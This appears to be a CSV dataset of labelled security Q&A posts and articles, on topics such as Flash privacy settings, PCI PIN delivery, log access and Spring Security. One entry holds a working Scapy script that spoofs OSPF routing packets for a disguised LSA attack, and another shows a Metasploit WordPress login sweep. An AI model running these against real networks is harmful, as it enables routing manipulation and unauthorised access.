A,C
"This is the last segment in the series. To begin with, I have a question for you… What do you call a device that has a 1 gigahertz microprocessor, 512 megabytes of RAM, several gigabytes of solid state storage, runs programs, can be programmed, and can access the internet? Sound a bit like a Netbook,

This is the last segment in the series. To begin with, I have a question for you…

What do you call a device that has a 1 gigahertz microprocessor, 512 megabytes of RAM, several gigabytes of solid state storage, runs programs, can be programmed, and can access the internet? Sound a bit like a Netbook, but computer is the answer I am looking for. Now add the ability to make phone calls on a CDMA or GSM network and you have a smart phone. The point is that your smart phone is a computer and many smart phones have the ability to run Adobe Flash. Flash is supported on Android version 2.2, Windows Mobile, and even on the iPhone 4. This means that it isn’t only your PC you need to be concerned with, but the spy is in your phone as well. The configuration options for mobile Flash are a lot more simplistic, but you need to go to https://settings.adobe.com/flashplayer/mobile/ on your mobile device. This is what it looks like on a Droid 2.

As you can see, there are no global settings. Taking a look at Local Storage and at Peer Assisted Networking we see that the default is for least privacy and peer-assisted networking is enabled.





Obviously selecting never for local storage provides the most privacy, but also the least functionality. Selecting “Only from sites I visit” is probably the most reasonable choice presented. Whether or not you enable the cache is really up to you. These telephony equipped computers have a lot less space than a standard PC, but caching components may decrease data usage if you do not have an unlimited plan. I simply disable peer-assisted networking. I’m really not interested in having someone else use my bandwidth.

Unlike the highly granular configuration options that are possible with the mms.cfg file on a PC, Flash on the mobile platform offers very little choice in protecting your privacy. If you have Flash on your mobile device, I recommend you visit the settings manager periodically to make sure your choices have not been altered in an update. If you are traveling in an area where roaming charges might apply, before you leave, you might want to disable local storage entirely for Flash, but that is for cost savings, not privacy.

To sum up the series, Adobe Flash does enable a lot of quality video content on the web, however the price it comes with is privacy. Adobe isn’t going to tell you how, who, or when Flash is being used to track you, so it is up to you to take control. Perhaps you are fine with being tracked, some people are, but you can’t make the decision if you don’t know there is a decision. I hope this series has helped you understand some of the risks associated with Flash, and some of your options for controlling your privacy.

Randy Abrams

Director of Technical Education

ESET LLC",1
"<p>First of all, you need to talk to a QSA on something like this.</p>

<p>That said, I believe the <a href=""https://www.pcisecuritystandards.org/documents/PCI_Card_Production_Logical_Security_Requirements_2013.pdf"" rel=""nofollow"">PCI Card Production Logical Security Requirements</a> document most closely applies to your issue.  And the sticker is that the <strong>cardholder does need to provide ""some sort of secret key.""</strong>  Specifically, section 10 <strong>PIN Distribution via Electronic Methods</strong> says you need to validate that the request is coming from the cardholder:</p>

<blockquote>
  <p>e) Communication of the PIN to the cardholder must only take place after
  verification of the identification value and associated authentication
  value. </p>
  
  <p>f) The identification and authentication values must not
  disclose the account number.</p>
  
  <p>g) The authentication mechanism or value  must be different than the identification value and must not be a value easily associated with the cardholder. </p>
  
  <p>h) The authentication
  value must be communicated to the cardholder in such a way that access
  by anyone other than the cardholder is detected.</p>
</blockquote>

<p>h) also implies that the cardholder can't pass their authentication value through the third party, but you knew that.</p>

<p>You're correct that REST or web services would not be appropriate, but <strong>an iframe is probably acceptable</strong>, because an iframe means that the communication regarding the PIN would be directly between the cardholder's browser and your server, bypassing the third party.  The third party simply provides the link that allows the cardholder to go directly to you.  iframe is probably the appropriate technology to meet your requirement of having it appear to come through the third party and the PCI requirement of requiring the transaction be directly between you from the cardholder.</p>

<p>Alternately, you could simply do a branded page.  You create a web page with the look and feel of your third parties' web site, and they link to your page.  Cardholders go to your site, your URL, but it looks enough like the third party to seem the same.</p>

<p>So, to sum up - the third party passes the cardholder to you, via iframe or direct link.  The cardholder submits authentication data to you and gets the PIN back, and ends up either continuing (iframe) or being redirected back to (direct link) the third party's site.  </p>

<p>You may not be able achieve one of your goals: to do this ""<em>transparently, so the customer doesn't have to enter a password or provide an encryption key.</em>""  That's not compatible with PCI requirements.  (That said, if your QSA approved, and the third party was able to sufficiently authenticate the cardholder through their normal process, and pass cryptographically strong proof of that along as a cookie or request parameter, then maybe you could make it transparent.  But that's where you really, really, really need a QSA's advice, because maybe that violates 'h' above)</p>
",1
"<p>As an IT auditor, let me give you an answer from experience. </p>

<p><strong>Segregation of duties - SOD</strong></p>

<p>It is a good practice and core principle to segregate employees who operate or administer the system from which audit logs are produced from employees such as myself, with responsibilities to review these logs for fraud / malicious activity / security vulnerabilities. If these duties are not segregated, then a single individual can undermine the system by making a malicious change, and cover his wrongdoing by modifying the audit logs to hide his actions. To illustrate, the following individuals <strong>in general</strong> should <strong>not</strong> have access to log data. </p>

<ol>
<li>Security administrators</li>
<li>Computer operations personnel</li>
<li>Data base administrators</li>
</ol>

<p>To expand on the above examples, if a security administrator has access to logs data, he can escalate his own privileges to allow for improper access greater than is appropriate for his job duties, a violation of the security principle of <strong>Least Privilege</strong>. To prevent or deter detection, he can delete and / or falsify values for log entries of date, user ID...etc. The same reasoning applies to items 2 and 3.</p>

<p>To prevent the aforementioned, logs can be centrally stored in a server in which access is strictly controlled to individuals with specific roles - RBAC. <strong>Periodic review of individuals having access to logs should be conducted and improper access rights should be removed immediately upon discovery.</strong></p>

<p><strong>Secure storage of logs</strong></p>

<p>Log data should be <strong>backed up on a regular basis and the backup should be stored offsite</strong> away from main company operations. This is to ensure that if a disaster (ex: Fire or flood) were to occur at the main company site, data loss will be mitigated.If logs contain sensitive information, log backups should be <strong>encrypted using strong cryptography such as AES 256.</strong> A written method, such as receipts should be used to track shipping and receipt of these logs. Periodically, a reconciliation of backup media should be taken against the tracking documentation, with <strong>any failed reconciliations promptly investigated.</strong></p>

<p>Monitoring procedures regarding security and confidentiality of backup storage should be documented. If these responsibilities are delegated to a third party to perform, SLAs and a contract should ideally be in place, explicitly specifying the duties of each party (Company and vendor), and ideally include a <strong>right to audit clause</strong> in the contract. Log retention length of time should be documented in a retention policy known to all individuals with a job role of handling backups.</p>

<p>Finally, to learn more, <a href=""http://www.isaca.org/Journal/archives/2012/Volume-6/Pages/What-Every-IT-Auditor-Should-Know-About-Proper-Segregation-of-Incompatible-IT-Activities.aspx"" rel=""nofollow"">this is an authoritative source</a> from ISACA.</p>
",1
"<p>I have a site that highlighted as having a malware. I found 88 files that were infected with ""php_include_obf_local"" which I deleated them all. But there is still a ""folder"" each time I delete it keeps auto creating itself ... how can I find where the malware is injecteing it from ? Its also a WordPress site ...</p>

<p>I have chaked all teh root files and found no injection code, I have already deleated 88 files with infection. And I have aldo downloaded a database dump and checked to see any reference to teh malware signiture nothing found!</p>

<p>below is a sample code thats getting loaded to the ""index.php"" file ...</p>

<pre><code>[[&lt;script type='text/javascript' language='javascript' &gt;   window._wpemojiSettings = { ""baseUrl"":""https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/"",""ext"":"".png"",""svgUrl"":""https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/"",""svgExt"":"".svg"",""source"": { ""concatemoji"":""http:\/\/tie.com.sa\/site\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.2.2"" }  };  !function(a,b,c) { function d(a,b) { var c=String.fromCharCode; l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0); var d=k.toDataURL(); l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0); var e=k.toDataURL(); return d===e } function e(a) { var b; if(!l||!l.fillText)return!1; switch(l.textBaseline=""top"",l.font=""600 32px Arial"",a) { case""flag"":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))%26%26(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b); case""emoji"":return b=d([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340]),!b } return!1 } function f(a) { var c=b.createElement(""script""); c.src=a,c.defer=c.type=""text/javascript"",b.getElementsByTagName(""head"")[0].appendChild(c) } var g,h,i,j,k=b.createElement(""canvas""),l=k.getContext%26%26k.getContext(""2d""); for(j=Array(""flag"",""emoji""),c.supports= { everything:!0,everythingExceptFlag:!0 } ,i=0; i&lt;j.length; i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything%26%26c.supports[j[i]],""flag""!==j[i]%26%26(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag%26%26c.supports[j[i]]); c.supports.everythingExceptFlag=c.supports.everythingExceptFlag%26%26!c.supports.flag,c.DOMReady=!1,c.readyCallback=function() { c.DOMReady=!0 } ,c.supports.everything||(h=function() { c.readyCallback() } ,b.addEventListener?(b.addEventListener(""DOMContentLoaded"",h,!1),a.addEventListener(""load"",h,!1)):(a.attachEvent(""onload"",h),b.attachEvent(""onreadystatechange"",function() { ""complete""===b.readyState%26%26c.readyCallback() } )),g=c.source|| {  } ,g.concatemoji?f(g.concatemoji):g.wpemoji%26%26g.twemoji%26%26(f(g.twemoji),f(g.wpemoji))) } (window,document,window._wpemojiSettings);     &lt;/script&gt;]]
</code></pre>

<p>Any idea on how to find and fix this issue ?</p>
",1
"<p>I am implementing SSL client authentication for our iPhone app and am using the app keychain to store the client identity (certificate + private key).  After adding the items to the keychain, I am getting some unexpected results when using SecItemCopyMatching.  Quick summary:  I add exactly one SecIdentityRef to the keychain, but SecItemCopyMatching finds two afterwards.  Let me start with the facts.</p>

<p>I am running my app on an iPod with iOS 4.3.5.</p>

<p>I have an empty app keychain to start with.</p>

<p>My certificates are all created using openssl and deployed to the iPod via a PKCS#12 file as an email attachment.
The PKCS#12 file contains:</p>

<ul>
<li>Client certificate</li>
<li>Client CA certificate (issuer of the Client certificate)</li>
<li>Root CA certificate (issuer of the Client CA certificate)</li>
<li>RSA private key of the client certificate</li>
</ul>

<p>SecPKCS12Import successfully imports the file and the resulting dictionary has the following content:</p>

<ul>
<li>one ""identity""</li>
<li>one ""trust""</li>
<li>one ""chain"" (CFArray which holds the three certificates mentioned above)</li>
</ul>

<p>Using SecItemAdd, I successfully add the ""identity"" to the keychain.</p>

<p>Next, I retrieve the ""chain"" array from the dictionary and attempt to add the certificates.  In doing so, the first one fails with error errSecDuplicateItem.  I assume this is because the first certificate is the client certificate and that it was already added to the keychain when I added the identity.  The other two certificates are added without error.</p>

<p>Now, if I go back and use SecItemCopyMatching with these key/value pairs...</p>

<pre><code> keys   = {kSecClass, kSecReturnRef, kSecMatchLimit}
 values = {kSecClassIdentity, kCFBooleanTrue, kSecMatchLimitAll}
</code></pre>

<p>...two identities are returned!  Furthermore, if I retrieve the certificate for each (SecIdentityCopyCertificate) and then the summary (SecCertificateCopySubjectSummary), I see the both identities have the same certificate!</p>

<p>Lastly, when I try to clear the identities from the keychain (SecItemDelete), the first attempt is successful but the second fails with errSecItemNotFound.</p>

<p>It is clear from all the googling I have been doing that there are ""issues"" with the iOS keychain.  However, I have not seen this reported; nor have I seen anything even remotely related.  </p>

<p>So, my questions:</p>

<ul>
<li>Am I using SecItemCopyMatching correctly?</li>
<li>When using SecItemCopyMatching to find identities in the keychain, how does it determine the identities that are present?  Is this dynamic, or strictly based on how many SecIdentityRef items were added?</li>
<li>could this problem possibly be related to the certificates themselves?  Note that despite this issue, I am still able to retrieve the first identity and certificates in order to respond to didReceiveAuthenticationChallenge.</li>
</ul>

<p>I can post code and/or certificate dump, if needed.</p>

<p>Thanks in advance,</p>

<p>Ken Cross
Siemens Enterprise Networks.</p>
",1
"<p>I want to do disguised LSA attacks on OSPF network and be able to more analyze, so I do not know how it works in practice. This is a penetration test.</p>

<p>The attack is described in the address<a href=""http://www.internetsociety.org/sites/default/files/P01_3.pdf"" rel=""nofollow noreferrer""> [+]</a>. I have run the network are as follows:</p>

<p><img src=""https://i.stack.imgur.com/IyJiG.png"" alt=""enter image description here""></p>

<p>Source program in accordance with the above photo are as follows:</p>

<pre><code>#!/usr/bin/env python


from scapy.all import *
load_contrib(""ospf"")
#from ospf import *
from time import sleep,clock,time

def ourSend(packet):
    sendp(packet,iface='eth0')     # is 192.168.184.131
#    sleep(2)

def ourSend2(packet):
    sendp(packet,iface='eth1') # is 192.168.57.20
#    sleep(2)


victim='172.16.1.1'          #This is the IP address of interface through which the victim will receive the trigger LSA. 
victimId='1.1.1.1'           #This the router ID of the victim router.
victimNeighbor='172.16.1.2'  #This is the IP address of a neighbor of the victim router to which the disguised LSA is sent
spoofSRC='192.168.184.131'           #This is an IP address of one of the neighbors of the victim. It is used as a spoofed IP 

host1='192.168.1.0'      #This will used in the bogus Link entries in the disguised LSA.
host2='192.168.2.0'      #This will used in the bogus Link entries in the disguised LSA.
sequence=7               #The sequence number of the disguised LSA

#The bogus Link entries to be included in the disguised LSA. The contents of the last link (collisionLink) is chosen 
# so that the LSA will have a specific checksum desirable to our network example (0x2028 in this example). The contents of this link has been
# calculated offline.  
link2host1 = OSPF_Link(id=host1,data='255.255.255.255',type=3)
link2host2 = OSPF_Link(id=host2,data='255.255.255.255',type=3)
link2victim = OSPF_Link(id=victimId,data=victim,type=2)
collisionLink = OSPF_Link(id='0.0.0.0',data='0.0.0.0',type=0,toscount=27,metric=156)

# Build the trigger LSA. Note that it is sent with sequence number that is smaller by one from the sequence of the disguised packet.
IPlayer=IP(src=spoofSRC,dst=victim)
OSPFHdr=OSPF_Hdr(src=spoofSRC)
trigger=Ether()/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence-1,\
                                            linkcount=3,linklist=[link2victim,link2host1,link2host2])])

#Buid the disguised LSA
IPlayer=IP(src=victim,dst=victimNeighbor)
OSPFHdr=OSPF_Hdr(src=victimId)
disguisedLsa=Ether()/IPlayer/OSPFHdr/OSPF_LSUpd(lsacount=1,lsalist=[OSPF_Router_LSA(id=victimId,adrouter=victimId,seq=sequence,\
                                            linkcount=3,linklist=[link2victim,link2host1,link2host2,collisionLink])])
#Send them both 
ourSend(trigger)
ourSend2(disguisedLsa)
</code></pre>

<p>But I do not know why did not affect!! Packet send but not affect.</p>

<p>IOS version : 12</p>

<p>VMnet1,VMnet8 interface is : HostOnly type.</p>
",1
"<p>You are searching for the <code>VHOST</code> option. As you may know, when you rent some web hosting services, you may choose between a dedicated server and a shared one (which is much more cheaper)</p>

<ul>
<li><p>On shared servers, you are sharing the same machine with random peoples. It means the websites hosted on a shared server will share the same IP address. That's why you need to write the virtual host option, it will specify which domain name you want to query on this IP address.</p></li>
<li><p>On dedicated servers, you can configure the machine the way you want. With or without virtual hosts. </p></li>
</ul>

<p>You can determine virtual host presence with the host command on your Linux distribution:</p>

<pre><code>┌──[13:33:43]─[root@attack3r]
└──&gt; ~ $ &gt;&gt; host target-website.com
   target-website.com has address 49.49.49.49
┌─[13:34:21]─[root@attack3r]
└──&gt; ~ $ &gt;&gt; host 49.49.49.49
   49.49.49.49.in-addr.arpa domain name pointer www.host-service-provider.com
</code></pre>

<p>In the example above, by resolving both the IP and target-website.com you can determine: </p>

<ul>
<li><p>The target website point to 49.49.49.49</p></li>
<li><p>49.49.49.49 point to the host service provider domain name</p></li>
</ul>

<p>In this example, target-website.com is a virtual host on 49.49.49.49. Otherwise, the IP lookup should return target-website.com, not the service provider domain name. </p>

<p>Keep in mind that there are some exceptions, for example, try to do the same operation with security.stackexchange.com</p>

<hr>

<h3>Testing without VHOST</h3>

<ul>
<li><code>use auxiliary/scanner/http/wordpress_xmlrpc_login</code></li>
<li><code>set RHOSTS 49.49.49.49</code></li>
<li><code>set TARGETURI /wp/</code></li>
<li><code>set USERNAME root</code></li>
<li><code>set PASSWORD toor</code></li>
<li><code>run</code></li>
</ul>

<p>Output</p>

<pre><code>[*] 49.49.49.49:80    :/wp/xmlrpc.php - Sending Hello...
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
[-] XMLRPC is not enabled! Aborting
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

<h3>Adding VHOST</h3>

<ul>
<li><code>set VHOST target-website.com</code></li>
<li><code>run</code></li>
</ul>

<p>output</p>

<pre><code>[*] 49.49.49.49:80    :/wp/xmlrpc.php - Sending Hello...
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
[+] 49.49.49.49:80   - XMLRPC enabled, Hello message received!
[*] Starting XML-RPC login sweep...
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
|R-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-49.49.49.49:80-&lt;&gt;&lt;&gt;-OK
[-] 49.49.49.49:80   - Failed: 'root:toor'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

<h3>edit : Answering comments</h3>

<p>yes it does:</p>

<p><a href=""https://i.stack.imgur.com/wtxVl.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wtxVl.jpg"" alt=""vhost""></a></p>
",1
"Hello every body, obligatory pass post here. Hopefully it helps others going through it like your posts did for me. I went in and made it to 100 questions before my exam ended. I was nervous to the point my eye started to twitch. Didn't think I'd even make it to 100 questions before the exam would end and send me home empty handed. 

One thing to note about that is that you shouldn't get discouraged by people on this sub saying the questions are ""COMPLETELY DIFFERENT, SUPER UNRELATED TO ANY OF THE THOUSAND BOOKS AND PRACTICE TESTS OUT THERE THAT YOULL EVER FIND"". I found this to just not be true. Yeah, the questions aren't going to be word for word like you have in the sybex book or boson but they were the same difficulty in my opinion especially like the practice tests in the supplementary sybex workbook with the thousand questions or so. 

I used the following:

-Sybex Official study guide seventh edition

-Complementary book of Sybex Official practice tests (I got the bundle) in my opinion these were the closest in difficulty and ""language"" if you will, to the real deal

-Boson practice exam, I know they're ""outdated""..... But they're not really. The exam doesn't change at all for this year. Only the weight of each domain. Also the format. So these are 1000% relevant, and helped me to understand ALOT more of the meat and bones of the material. It helps to go back and redo the questions you got incorrect so you can really absorb it.

I got both sybex official apps. If I knew that the questions were gonna be exactly the same as in the 2 books I would have never bought the books. Not because the books were useless per se, but I'm definitely not the type of person to read that monster cover to cover and expect to retain ANY valuable information.

A bit of my background, I did help desk / sysadmin for about 3 years before I got an ""official"" systems analyst role for a fourth year all of which were in hospitality. It was basically a bit of everything, from incident response, to help desk, to server stuff, networking, management, etc etc I know it doesn't seem like alot but I learned ALOT of everything IT related those years. I currently work in information security for a financial services company for about 1 year and 4 months now. I am fortunate enough to have to deal alot with what is covered in this exam, like the policies, standards, risk management, sdlc, PCI, Sox, business models, etc.

 I am the type of person to never stop learning because I absolutely love it and want to utilize that to push myself to further my career. 

I currently hold a+, n+, sec+, SSCP, eJPT from elearnsecurity, and a ton of learning from previously studying for OSCP which I took a break from to knock this monster out.

Overall I studied about 3 months, February I basically skimmed the stuff over deciding to hit it hard in March and this month.

TLDR; don't listen to the negative shit on this board and if you don't sit for the exam because you're busy shitting yourself like I was, FUCK it, take the exam

Edit: grandma. I mean grammar.
",1
"<p>Let's get something straight first. In the general sense, there's pretty much no such thing as tamper-resistant in the envelop/packaging world. What you're looking for is tamper-<strong>evident</strong>.</p>

<p>The criteria upon which you evaluate tamper-evident envelope is same used for evaluating any other security measurement. Forget everything about solution itself and rather think of <em>why</em> you're looking for a solution. It's easy to say that your problem is tampering, but it's not.</p>

<p>So the criteria hugely depends on <em>your</em> threat model.
 Other than that, there's basically one criterion; If the envelope is tampered with, we'd like to detect that with a high level of confidence.</p>

<hr>

<p>In 1997, The Nuclear Regulatory Commission issued the <a href=""http://www.orau.org/ptp/PTP%20Library/library/NRC/Reguide/05-015.PDF"" rel=""nofollow"">RG 5.15</a> in which they outlined criteria upon which to judge the effectiveness of tamper-evident mediums used to store nuclear documents. I'll quote some of them</p>

<blockquote>
  <ul>
  <li><p>The information taken and recorded at the time of seal application is inadequately protected, enabling a diverter to forge documentation
  to support or cover the diversion.</p></li>
  <li><p>The method of postmortem examination of the seal is not sufficient to detect a defective or compromised seal.</p></li>
  <li><p>The location and method of seal application makes the seals vulnerable
  to accidental damage, providing a history of such incidents that might
  be used to conceal a willful attack.</p></li>
  </ul>
</blockquote>

<p>After that they list some certain acceptable types of tamper-deviant devices to store the highly sensitive data.</p>

<p>In the same year, researcher R.G. Johnston <a href=""http://library.lanl.gov/cgi-bin/getfile?00418792.pdf"" rel=""nofollow"">published a paper</a> outlining some deficiencies in the RG 5.15 and the then-standard <a href=""http://www.astm.org/Standards/F1158.htm"" rel=""nofollow"">ASTM F1158-88</a> protocol. Johnston did a great job providing crystal clear instructions for the process, combining the pros of the previous standards and patching most of their cons.</p>

<blockquote>
  <p>A detailed description of the successful attacks. For each attack the
  following information should be provided:</p>
  
  <ul>
  <li><p>Is the attack theoretical, partially demonstrated, fully demonstrated but not perfected, or practiced to perfection?</p></li>
  <li><p>What are the cost, time, and effort to devise and demonstrate the attack?</p></li>
  <li><p>What time is required on-site to do the attack?</p></li>
  </ul>
  
  <p>..</p>
  
  <ul>
  <li><p>What is the level of defeat?</p></li>
  <li><p>Is inside information necessary for the attack, or just what is publicly available?</p></li>
  </ul>
</blockquote>

<p>Despite <a href=""http://www.ne.anl.gov/capabilities/vat/seals/references.html"" rel=""nofollow"">Johnston's findings and recommendations</a>, the ASTM F1158 still the de facto standard protocol for assessing security seals.</p>
",1
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""https://stackoverflow.com/questions/3087548/can-spring-security-use-preauthorize-on-spring-controllers-methods"">Can Spring Security use @PreAuthorize on Spring controllers methods?</a>  </p>
</blockquote>



<p>Here is my configuration:
pom.xml</p>

<pre><code>&lt;!-- Spring Security --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-config&lt;/artifactId&gt;
    &lt;version&gt;${spring-security.version}&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-taglibs&lt;/artifactId&gt;
    &lt;version&gt;${spring-security.version}&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;
    &lt;artifactId&gt;spring-security-web&lt;/artifactId&gt;
    &lt;version&gt;${spring-security.version}&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;

&lt;!-- AOP dependency --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;cglib&lt;/groupId&gt;
    &lt;artifactId&gt;cglib&lt;/artifactId&gt;
    &lt;version&gt;2.2&lt;/version&gt;
&lt;/dependency&gt;
&lt;!-- end of Spring Security --&gt;
</code></pre>

<p>here is security.xml -> </p>

<pre><code>    &lt;!-- secured-annotations = (@Secured(""ROLE_ADMIN"")) --&gt;
    &lt;!-- jsr250-annotations = (@RunAs @RolesAllowed @PermitAll @DenyAll @DeclareRoles) --&gt;
    &lt;!-- pre-post-annotations = @PreAuthorized(""hasAuthority('ROLE_ADMIN')"") --&gt;

&lt;global-method-security secured-annotations=""disabled""
                        jsr250-annotations=""disabled""
                        pre-post-annotations=""enabled""/&gt;

&lt;http       auto-config='true' 
            disable-url-rewriting=""true"" 
            access-denied-page=""/WEB-INF/jsp/errors/accessDenied.jsp""&gt;


    &lt;anonymous granted-authority=""ROLE_ANONYMOUS"" key=""anonymous""/&gt;


    &lt;logout logout-url=""/logout.do"" logout-success-url=""/"" /&gt;

    &lt;form-login always-use-default-target=""false"" 
        authentication-failure-url=""/?authfailed=true"" 
        default-target-url=""/person""
        login-page=""/"" 
        login-processing-url=""/login""
        username-parameter=""username"" 
        password-parameter=""password"" 
         /&gt;

      &lt;remember-me key=""rememberMe"" services-ref=""rememberMeService""/&gt;
&lt;/http&gt;
</code></pre>

<p>When I try run any controller like -> </p>

<p>@RequestMapping(""/person"")
public class PersonController {</p>

<pre><code>@RequestMapping("""")
    @PreAuthorize(""hasAuthority('ROLE_ADMIN')"")
public String root() {
    doStuff();
    return ""redirect:/person/home"";
}
</code></pre>

<p>with any different role, I got right result.  so @PreAuthorize(""hasAuthority('ROLE_ADMIN')"") annotation is not working. </p>

<p>No compilation mistakes, no runtime exceptions.</p>

<p>Thanks.</p>
",1
